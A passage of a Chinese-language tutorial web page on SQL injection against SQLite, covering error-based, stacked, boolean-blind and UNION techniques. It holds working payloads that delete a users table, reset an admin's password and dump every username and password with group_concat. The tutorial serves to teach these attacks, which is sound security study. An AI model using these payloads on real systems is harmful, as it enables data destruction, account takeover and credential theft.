+<a class=anchor href=#%e5%88%a9%e7%94%a8%e4%b8%8d%e5%ad%98%e5%9c%a8%e7%9a%84%e5%87%bd%e6%95%b0>#</a></h4><pre tabindex=0><code class=language-sqlite data-lang=sqlite>&#39; AND (SELECT 报错位置(sql) FROM sqlite_master LIMIT 1)--
+</code></pre><p><code>报错位置</code> 是一个不存在的函数名。SQLite 会先计算子查询 <code>(SELECT sql FROM ...)</code>，得到字符串，然后把字符串传给这个不存在的函数，最后报错。报错信息里就会显示子查询的结果。</p><h4 id=利用语法冲突>利用语法冲突
+<a class=anchor href=#%e5%88%a9%e7%94%a8%e8%af%ad%e6%b3%95%e5%86%b2%e7%aa%81>#</a></h4><pre tabindex=0><code class=language-sqlite data-lang=sqlite>&#39; AND 1=(SELECT sql FROM sqlite_master WHERE type=&#39;table&#39; LIMIT 1 OFFSET 0)--
+</code></pre><p>这里的关键是制造<strong>类型冲突</strong>。左边是数字 <code>1</code>，右边子查询返回的是文本（建表语句），两者比较时报错，错误信息会显示文本内容。</p><h3 id=堆叠注入>堆叠注入
+<a class=anchor href=#%e5%a0%86%e5%8f%a0%e6%b3%a8%e5%85%a5>#</a></h3><p>后端使用<code>sqlite3_exec()</code>一类能执行多条语句的函数，不做限制。</p><p>这是 SQLite 比 MySQL 更危险的地方——<strong>它原生支持多语句执行</strong>，PHP 的 PDO 默认也没限制。</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>&#39;; DELETE FROM users; --
+&#39;; UPDATE users SET password=&#39;hacked&#39; WHERE username=&#39;admin&#39;; --
+</code></pre><h3 id=sqlite-特殊技巧>SQLite 特殊技巧
+<a class=anchor href=#sqlite-%e7%89%b9%e6%ae%8a%e6%8a%80%e5%b7%a7>#</a></h3><h4 id=布尔注入加速通配符猜解>布尔注入加速：通配符猜解
+<a class=anchor href=#%e5%b8%83%e5%b0%94%e6%b3%a8%e5%85%a5%e5%8a%a0%e9%80%9f%e9%80%9a%e9%85%8d%e7%ac%a6%e7%8c%9c%e8%a7%a3>#</a></h4><p>不用一位一位猜，可以用 <code>LIKE</code> 和 <code>GLOB</code> 配合通配符快速逼近：</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>-- 猜密码是不是 &#39;a%&#39;
+&#39; AND (SELECT password FROM users LIMIT 1) LIKE &#39;a%&#39;--
+-- 猜密码第一个字符范围
+&#39; AND (SELECT password FROM users LIMIT 1) GLOB &#39;[a-m]*&#39;--
+</code></pre><p><code>GLOB</code> 是大小写敏感的，<code>[a-m]*</code> 表示 a 到 m 之间的字母开头。</p><h4 id=串联所有数据group_concat-一把梭>串联所有数据：<code>group_concat()</code> 一把梭
+<a class=anchor href=#%e4%b8%b2%e8%81%94%e6%89%80%e6%9c%89%e6%95%b0%e6%8d%aegroup_concat-%e4%b8%80%e6%8a%8a%e6%a2%ad>#</a></h4><p>拿到一个回显位就能吐出一整列：</p><pre tabindex=0><code class=language-sqlite data-lang=sqlite>&#39; UNION SELECT 1, group_concat(username || &#39;:&#39; || password), 3 FROM users--
+</code></pre></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#sqlite-基础>SQLite 基础</a><ul><li><a href=#sqlite简介>SQLite简介</a></li><li><a href=#sqlite-基本语法与操作>SQLite 基本语法与操作</a></li><li><a href=#特殊的数据库sqlite_master>特殊的数据库：sqlite_master</a></li><li><a href=#常用内置函数>常用内置函数</a></li></ul></li><li><a href=#sqlite-场景下的注入攻击方法>SQLite 场景下的注入攻击方法</a><ul><li><a href=#联合查询注入>联合查询注入</a></li><li><a href=#盲注>盲注</a></li><li><a href=#报错注入>报错注入</a></li><li><a href=#堆叠注入>堆叠注入</a></li><li><a href=#sqlite-特殊技巧>SQLite 特殊技巧</a></li></ul></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var t,n,s,i=e.target.closest(".home-tree-toggle"),a=e.target.closest(".home-section-label"),o=i||a;if(!o)return;if(s=o.closest("li"),!s)return;if(n=s.querySelector(".home-tree-children"),t=s.querySelector(".home-tree-toggle"),!n||!t)return;e.preventDefault(),n.classList.contains("hidden")?(n.classList.remove("hidden"),t.classList.remove("collapsed"),t.classList.add("expanded")):(n.classList.add("hidden"),t.classList.remove("expanded"),t.classList.add("collapsed"))}),e=document.createElement("div"),e.className="preview-tooltip",document.body.appendChild(e),document.querySelectorAll(".home-article-link[data-summary]").forEach(function(t){t.addEventListener("mouseenter",function(s){if(window.innerWidth<=768)return;var o=t.getAttribute("data-summary");if(!o)return;n=setTimeout(function(){var t,n,i=o.length>200?o.substring(0,200)+"...":o;e.textContent=i,e.style.display="block",t=s.clientX+15,n=s.clientY+15,t+420>window.innerWidth&&(t=s.clientX-420-15),n+100>window.innerHeight&&(n=s.clientY-100),e.style.left=t+"px",e.style.top=n+"px"},500)}),t.addEventListener("mouseleave",function(){clearTimeout(n),e.style.display="none"})})})()</script></body></html>
